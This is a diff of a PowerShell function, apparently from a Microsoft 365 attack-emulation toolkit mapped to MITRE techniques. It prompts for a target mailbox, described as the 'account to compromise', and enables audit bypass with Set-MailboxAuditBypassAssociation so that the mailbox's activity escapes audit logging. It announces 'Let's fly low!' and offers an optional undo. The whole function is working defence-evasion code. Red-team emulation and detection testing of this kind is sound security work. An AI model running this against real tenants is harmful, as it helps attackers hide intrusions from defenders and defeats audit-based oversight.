@@ -1,47 +1,41 @@
 function DisableMailboxAuditing{
 
     mitre_details("DisableMailboxAuditing")
+    
+    EnterMailbox("Enter a mailbox address to disable auditing for")
 
-    #Recon available mailboxes
-    $inititate_recon = Read-Host -Prompt "`nInitiate recon to retrive available mailbox addresses (Yes/No)"
-    if ($inititate_recon -notin "No","no","N","n"){
-        Get-Mailbox | Format-Table -Property DisplayName,PrimarySmtpAddress 
-    }
-    else {
-        #DoNothing
-    }
+    #Enter account to compromise
+    $target_mailbox = $global:mailbox_address
 
-    $InternalUserName = Read-Host -Prompt 'Enter account you would like to disable auditing for'
-
-    Get-MailboxAuditBypassAssociation -Identity $InternalUserName | Format-Table AuditBypassEnabled
+    Get-MailboxAuditBypassAssociation -Identity $target_mailbox | Format-Table AuditBypassEnabled
 
     $user_confirm = Read-Host -Prompt "Confirm disbaling Audit logging for this account? (yes/no)"
 
     if ($user_confirm -notin "No","no","N","n") {
         try {
-            Write-Host "Disabling mailbox auditing for $InternalUserName ..."
-            Set-MailboxAuditBypassAssociation -Identity $InternalUserName -AuditByPassEnabled $true -ErrorAction Stop
+            Write-Host "Disabling mailbox auditing for $target_mailbox ..."
+            Set-MailboxAuditBypassAssociation -Identity $target_mailbox -AuditByPassEnabled $true -ErrorAction Stop
             Start-Sleep -s 60
-            Get-MailboxAuditBypassAssociation -Identity $InternalUserName | Format-Table AuditBypassEnabled
-            Write-Host "Let's fly low! Successfully disabled auditing!!!" -ForegroundColor Yellow -BackgroundColor Black
+            Get-MailboxAuditBypassAssociation -Identity $target_mailbox | Format-Table AuditBypassEnabled
+            Write-Host "`n[Success] Let's fly low! Successfully disabled auditing!!!" -ForegroundColor Yellow
             $allow_undo = $true
         }
         catch {
-            Write-Host "Error: Failed to disable auditing on mailbox $InternalUserName!!!" -ForegroundColor Yellow -BackgroundColor Black
+            Write-Host "`n[Error] Failed to disable auditing on mailbox $target_mailbox!!!" -ForegroundColor Red
         }      
     }
 
     #Undo changes
     if ($allow_undo -eq $true) {
         Write-Host "`n"
-        $user_confirm = Read-Host -Prompt 'Would you like to re-enable logging for the account? (yes/no)'
+        $user_confirm = Read-Host -Prompt '`nWould you like to re-enable logging for the account? (yes/no)'
 
         if ($user_confirm -notin "No","no","N","n") {
-            Write-Host "Re-enabling mailbox auditing for $InternalUserName ..."
-            Set-MailboxAuditBypassAssociation -Identity $InternalUserName -AuditByPassEnabled $false
+            Write-Host "`nRe-enabling mailbox auditing for $target_mailbox ..." -ForegroundColor Gray
+            Set-MailboxAuditBypassAssociation -Identity $target_mailbox -AuditByPassEnabled $false
             Start-Sleep -s 60    
-            Get-MailboxAuditBypassAssociation -Identity $InternalUserName | Format-Table AuditBypassEnabled 
-            Write-Host "Undo successful: Re-enabled auditing!!!" -ForegroundColor Yellow -BackgroundColor Black
+            Get-MailboxAuditBypassAssociation -Identity $target_mailbox | Format-Table AuditBypassEnabled 
+            Write-Host "`n[Undo Success] Re-enabled auditing!!!" -ForegroundColor Yellow
         }
     }
     Pause
